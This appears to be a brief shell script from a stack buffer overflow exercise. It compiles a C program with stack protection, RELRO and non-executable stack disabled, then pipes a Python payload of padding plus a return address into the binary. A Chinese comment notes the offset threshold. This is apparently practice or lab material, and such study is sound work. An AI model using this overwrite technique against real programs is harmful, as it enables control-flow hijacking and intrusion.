#cc main.c -o main -g -mpreferred-stack-boundary=2 -no-pie -fno-stack-protector -Wl,-z,norelro -z execstack
cc main.c -o main -g -mpreferred-stack-boundary=4 -fno-stack-protector -Wl,-z,norelro -z execstack
#objdump -d main

echo =========================================================================
echo -------------------------------------------------------------------------
python -c 'print "a"*24+"\x42\x05\x40"' | ./main
echo .........................................................................
#####################################################
#0x20  + 8是阈值
